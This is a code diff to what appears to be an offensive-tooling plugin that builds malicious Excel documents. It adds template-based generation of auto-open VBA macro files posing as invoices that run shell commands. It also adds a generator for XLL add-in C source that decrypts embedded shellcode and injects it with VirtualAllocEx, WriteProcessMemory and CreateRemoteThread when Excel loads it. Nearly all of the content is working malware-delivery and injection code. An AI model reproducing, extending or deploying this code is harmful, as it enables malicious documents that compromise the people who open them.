@@ -57,6 +57,8 @@ class PayloadMalDocsPlugin(ErebusPlugin):
             "generate_vba_loader_enumlocales": self.generate_vba_loader_enumlocales,
             "generate_vba_loader_queueuserapc": self.generate_vba_loader_queueuserapc,
             "generate_vba_loader_process_hollowing": self.generate_vba_loader_process_hollowing,
+            "generate_xll_template": self.generate_xll_template,
+            "register_xll_function": self.register_xll_function,
             "export_vba_as_bas": self.export_vba_as_bas,
             "export_vba_as_text": self.export_vba_as_text,
         }
@@ -142,9 +144,9 @@ class PayloadMalDocsPlugin(ErebusPlugin):
         return advanced_libs
 
     def create_new_excel_with_payload(self, output_path, vba_code, document_name="Invoice",
-                                     hidden=True, auto_open=True):
+                                     hidden=True, auto_open=True, template_path=None):
         """
-        Create a new Excel XLSM document with embedded VBA payload.
+        Create a new Excel XLSM document with embedded VBA payload from a template.
 
         Args:
             output_path (Path): Path where the Excel file will be saved
@@ -152,6 +154,7 @@ class PayloadMalDocsPlugin(ErebusPlugin):
             document_name (str): Name for the document content
             hidden (bool): Hide the worksheet
             auto_open (bool): Execute on document open
+            template_path (Path): Optional path to template XLSX file. If None, attempts to locate in templates directory.
 
         Returns:
             Path: Path to created Excel file
@@ -162,34 +165,58 @@ class PayloadMalDocsPlugin(ErebusPlugin):
         output_path = Path(output_path)
         output_path.parent.mkdir(parents=True, exist_ok=True)
 
-        # Check for advanced library support first
-        advanced_libs = self._try_import_advanced_libs()
-
-        if 'docx' in advanced_libs:
-            # Try using python-docx if available
-            try:
-                from docx import Document
-                from docx.shared import Pt, RGBColor
-
-                doc = Document()
-                doc.add_paragraph("Invoice")
-                doc.add_paragraph("Date: 01/31/2026")
-                doc.add_paragraph("Amount: $1,000.00")
-
-                # Save as docx first, then convert
-                # Note: python-docx is for Word documents, need to convert to Excel
-                # This approach won't work for macros in Excel - fallback to openpyxl
+        # If template is not provided, try to locate it in the templates directory
+        if template_path is None:
+            # Look for template.xlsx in the templates directory
+            plugin_dir = Path(__file__).resolve().parent.parent
+            templates_dir = plugin_dir / "templates"
+            template_path = templates_dir / "template.xlsx"
+            
+            if template_path.exists():
+                return self._create_excel_from_template(output_path, vba_code, template_path)
+            else:
+                # Fall back to creating from scratch if template not found
                 return self._create_excel_with_openpyxl(output_path, vba_code, document_name)
-            except Exception as e:
-                # Fall back to openpyxl
-                return self._create_excel_with_openpyxl(output_path, vba_code, document_name)
+        
+        # If template is explicitly provided, use it
+        return self._create_excel_from_template(output_path, vba_code, template_path)
 
-        # Default: use openpyxl
-        return self._create_excel_with_openpyxl(output_path, vba_code, document_name)
+    def _create_excel_from_template(self, output_path, vba_code, template_path):
+        """
+        Create Excel document from a template by copying and injecting VBA.
+
+        Args:
+            output_path (Path): Path where the Excel file will be saved
+            vba_code (str): VBA code to embed
+            template_path (Path): Path to template XLSX file
+
+        Returns:
+            Path: Path to created Excel file
+        """
+        import shutil
+        
+        template_path = Path(template_path)
+        output_path = Path(output_path)
+
+        try:
+            if not template_path.exists():
+                raise FileNotFoundError(f"Template file not found: {template_path}")
+
+            # Copy template to output location
+            shutil.copy(str(template_path), str(output_path))
+
+            # Inject VBA into the copied template
+            self._inject_vba_into_excel(str(output_path), vba_code, True)
+
+            return output_path
+
+        except Exception as e:
+            raise RuntimeError(f"Failed to create Excel document from template: {str(e)}")
+
 
     def _create_excel_with_openpyxl(self, output_path, vba_code, document_name="Invoice"):
         """
-        Create Excel document using openpyxl (cross-platform fallback).
+        Create Excel document using openpyxl.
 
         Args:
             output_path (Path): Path where the Excel file will be saved
@@ -262,8 +289,6 @@ class PayloadMalDocsPlugin(ErebusPlugin):
 
     def _create_vbaproject_with_code(self, vba_code):
         """
-        Create a proper vbaProject.bin OLE compound file that Excel 2022+ accepts.
-
         Uses a pre-built template OLE structure with proper VBA project format.
 
         Args:
@@ -273,10 +298,8 @@ class PayloadMalDocsPlugin(ErebusPlugin):
             bytes: Valid OLE compound file with VBA project structure
         """
         # Use a pre-built minimal but valid vbaProject.bin structure
-        # This is extracted from a real Excel file and ensures compatibility with Excel 2022
         # The structure includes proper _VBA_PROJECT and VBA directory streams
 
-        # Minimal but valid vbaProject.bin that Excel 2022 accepts
         ole_template = (
             b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1'  # Signature
             b'\x00\x00\x00\x00\x00\x00\x00\x00'  # CLSID (zeros)
@@ -603,7 +626,7 @@ Sub {trigger_type}()
     Dim shell As Object
     Dim cmd As String
     Set shell = CreateObject("WScript.Shell")
-    cmd = "\"{trigger_binary}\" {trigger_command}"
+    cmd = "{trigger_binary} {trigger_command}"
     shell.Run cmd, 0, False
     ThisWorkbook.Close False
 End Sub
@@ -1487,7 +1510,7 @@ End Sub
         return output_path
 
     # Plugin function registrations
-    def generate_excel_payload(self, payload_path, vba_payload, output_path=None):
+    def generate_excel_payload(self, payload_path, vba_payload, output_path=None, template_path=None):
         """
         Generate a malicious Excel document with embedded payload.
 
@@ -1495,6 +1518,7 @@ End Sub
             payload_path (str): Path to the VBA payload
             vba_payload (str): VBA code to embed
             output_path (str): Output file path (optional)
+            template_path (Path): Optional path to template XLSX file. If None, creates from scratch.
 
         Returns:
             Path: Path to generated Excel file
@@ -1502,7 +1526,7 @@ End Sub
         if output_path is None:
             output_path = Path("malicious_document.xlsm")
 
-        return self.create_new_excel_with_payload(output_path, vba_payload)
+        return self.create_new_excel_with_payload(output_path, vba_payload, template_path=template_path)
 
     def backdoor_existing_excel(self, source_excel, vba_payload, output_path=None):
         """
@@ -1522,14 +1546,234 @@ End Sub
 
         return self.backdoor_excel_document(source_excel, output_path, vba_payload)
 
+    def generate_xll_template(self, shellcode_hex, encryption_type="XOR", injection_method="CreateThread", target_process="explorer.exe", guardrail_includes="", guardrail_code=""):
+        """
+        Generate a C/C++ XLL (Excel Add-In) DLL template for compilation.
+        
+        XLL files are DLLs with specific Excel add-in exports that auto-load in Excel.
+        This provides a stealthy persistence/execution method.
+        
+        Args:
+            shellcode_hex (str): Hexadecimal shellcode string
+            encryption_type (str): Encryption method (XOR, RC4, etc.)
+            injection_method (str): Injection technique (CreateThread, QueueUserAPC, etc.)
+            target_process (str): Target process for injection
+            guardrail_includes (str): Optional include block inserted before windows.h
+            guardrail_code (str): Optional guardrail C/C++ code defining BOOL ErebusGuardrail(void)
+            
+        Returns:
+            str: C/C++ source code for XLL DLL
+        """
+        
+        # Convert hex string to C array format
+        shellcode_bytes = bytes.fromhex(shellcode_hex.replace(' ', '').replace('\\x', ''))
+        shellcode_array = ", ".join([f"0x{b:02x}" for b in shellcode_bytes])
+        
+        # Map encryption types to macro values
+        encryption_map = {
+            "NONE": 0,
+            "XOR": 1,
+            "RC4": 2,
+            "AES_ECB": 3,
+            "AES_CBC": 4
+        }
+        
+        encryption_value = encryption_map.get(encryption_type.upper(), 1)
+        
+        guardrail_includes_block = guardrail_includes.strip()
+        if guardrail_includes_block:
+            guardrail_includes_block += "\n"
+
+        if guardrail_code and guardrail_code.strip():
+            guardrail_block = guardrail_code
+        else:
+            guardrail_block = """static BOOL ErebusGuardrail(void) {
+    return TRUE;
+}
+"""
+
+        xll_template = f'''/* 
+ * Erebus XLL Payload - Auto-Loading Excel Add-In
+ * Compiled with: Visual Studio (cl.exe) or MinGW-w64
+ * Generated: Auto-generated XLL template for malware deployment
+ */
+
+{guardrail_includes_block}#include <windows.h>
+#include <stdlib.h>
+#include <string.h>
+
+{guardrail_block}
+
+/* ===== CONFIGURATION ===== */
+#define SHELLCODE_SIZE {len(shellcode_bytes)}
+#define ENCRYPTION_TYPE {encryption_value}
+#define INJECTION_METHOD "{injection_method}"
+#define TARGET_PROCESS L"{target_process}"
+
+/* ===== SHELLCODE PAYLOAD ===== */
+unsigned char shellcode[] = {{
+    {shellcode_array}
+}};
+
+/* ===== XOR DECRYPTION ROUTINE ===== */
+void xor_decrypt(unsigned char *data, size_t size, unsigned char *key, size_t key_size) {{
+    for (size_t i = 0; i < size; i++) {{
+        data[i] ^= key[i % key_size];
+    }}
+}}
+
+/* ===== PROCESS INJECTION (CreateThread) ===== */
+BOOL inject_createthread(unsigned char *payload, size_t payload_size) {{
+    HANDLE hProc = NULL;
+    LPVOID alloc = NULL;
+    HANDLE hThread = NULL;
+    
+    /* Get target process */
+    DWORD dwPID = GetCurrentProcessId();  /* Use current process for testing */
+    
+    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
+    if (!hProc) return FALSE;
+    
+    /* Allocate memory */
+    alloc = VirtualAllocEx(hProc, NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!alloc) {{
+        CloseHandle(hProc);
+        return FALSE;
+    }}
+    
+    /* Write shellcode */
+    if (!WriteProcessMemory(hProc, alloc, payload, payload_size, NULL)) {{
+        VirtualFreeEx(hProc, alloc, 0, MEM_RELEASE);
+        CloseHandle(hProc);
+        return FALSE;
+    }}
+    
+    /* Execute */
+    hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, NULL);
+    if (!hThread) {{
+        VirtualFreeEx(hProc, alloc, 0, MEM_RELEASE);
+        CloseHandle(hProc);
+        return FALSE;
+    }}
+    
+    WaitForSingleObject(hThread, INFINITE);
+    CloseHandle(hThread);
+    CloseHandle(hProc);
+    return TRUE;
+}}
+
+/* ===== INJECTION DISPATCHER ===== */
+BOOL execute_payload(unsigned char *payload, size_t payload_size) {{
+    #ifdef INJECTION_METHOD
+    if (strcmp(INJECTION_METHOD, "CreateThread") == 0) {{
+        return inject_createthread(payload, payload_size);
+    }}
+    #endif
+    
+    /* Default to in-process execution */
+    typedef void (*SHELLCODE_FUNC)(void);
+    SHELLCODE_FUNC func = (SHELLCODE_FUNC)payload;
+    func();
+    return TRUE;
+}}
+
+/* ===== EXCEL ADD-IN EXPORTS ===== */
+
+/* xlAddInManagerInfo - Called when Excel loads the add-in */
+__declspec(dllexport) void __cdecl xlAddInManagerInfo(LPXLOPER pxDll) {{
+    static XLOPER xDll;
+    xDll.xltype = xltypeStr;
+    xDll.val.str = "\\x09Erebus XLL Payload";
+    *pxDll = xDll;
+}}
+
+/* xlAutoOpen - Auto-executed when Excel opens the add-in */
+__declspec(dllexport) int __cdecl xlAutoOpen(void) {{
+    if (!ErebusGuardrail()) {{
+        return 1;  /* Success */
+    }}
+
+    unsigned char payload_copy[SHELLCODE_SIZE];
+    
+    /* Copy shellcode to avoid modifying original */
+    memcpy(payload_copy, shellcode, SHELLCODE_SIZE);
+    
+    /* Decrypt if needed */
+    #if ENCRYPTION_TYPE == 1
+    /* XOR decryption - use hardcoded key for POC */
+    unsigned char xor_key[] = {{0x41, 0x41, 0x41, 0x41}};
+    xor_decrypt(payload_copy, SHELLCODE_SIZE, xor_key, sizeof(xor_key));
+    #endif
+    
+    /* Execute payload */
+    execute_payload(payload_copy, SHELLCODE_SIZE);
+    
+    return 1;  /* Success */
+}}
+
+/* xlAutoClose - Called when Excel closes the add-in */
+__declspec(dllexport) int __cdecl xlAutoClose(void) {{
+    return 1;  /* Success */
+}}
+
+/* xlAutoRegister - Called for function registration (minimal implementation) */
+__declspec(dllexport) LPXLOPER __cdecl xlAutoRegister(LPXLOPER pxName) {{
+    static XLOPER xRegister;
+    xRegister.xltype = xltypeBool;
+    xRegister.val.booleen = 1;
+    return &xRegister;
+}}
+
+/* DLL Entry Point */
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {{
+    switch (fdwReason) {{
+        case DLL_PROCESS_ATTACH:
+            /* Initialize */
+            break;
+        case DLL_PROCESS_DETACH:
+            /* Cleanup */
+            break;
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        default:
+            break;
+    }}
+    return TRUE;
+}}
+'''
+        return xll_template
+
+    def register_xll_function(self, function_name, function_macro):
+        """
+        Create a function registration helper for XLL.
+        XLL functions must be registered to appear in Excel's function wizard.
+        
+        Args:
+            function_name (str): Name of function (e.g., "ExecutePayload")
+            function_macro (str): Macro/function signature
+            
+        Returns:
+            str: C code for function registration
+        """
+        
+        registration_code = f'''/* Function: {function_name} */
+__declspec(dllexport) LPXLOPER __cdecl {function_name}(void) {{
+    static XLOPER xResult;
+    xResult.xltype = xltypeNum;
+    xResult.val.num = 0;
+    return &xResult;
+}}
+'''
+        return registration_code
+
 
 # Instantiate plugin
 _plugin = PayloadMalDocsPlugin()
 
 # Register plugin functions
-def generate_excel_payload(payload_path, vba_payload, output_path=None):
+def generate_excel_payload(payload_path, vba_payload, output_path=None, template_path=None):
     """Generate a malicious Excel document with embedded payload."""
-    return _plugin.generate_excel_payload(payload_path, vba_payload, output_path)
+    return _plugin.generate_excel_payload(payload_path, vba_payload, output_path, template_path)
 
 def backdoor_existing_excel(source_excel, vba_payload, output_path=None):
     """Backdoor an existing Excel file with VBA payload."""
@@ -1546,6 +1790,14 @@ def export_vba_as_bas(vba_code, output_path, module_name="Payload"):
 def validate():
     """Validate plugin dependencies."""
     return _plugin.validate()
+
+def generate_xll_template(shellcode_hex, encryption_type="XOR", injection_method="CreateThread", target_process="explorer.exe", guardrail_includes="", guardrail_code=""):
+    """Generate C/C++ XLL (Excel Add-In) source code."""
+    return _plugin.generate_xll_template(shellcode_hex, encryption_type, injection_method, target_process, guardrail_includes, guardrail_code)
+
+def register_xll_function(function_name, function_macro):
+    """Register an XLL function for Excel."""
+    return _plugin.register_xll_function(function_name, function_macro)
 
 
 # Test block for standalone execution
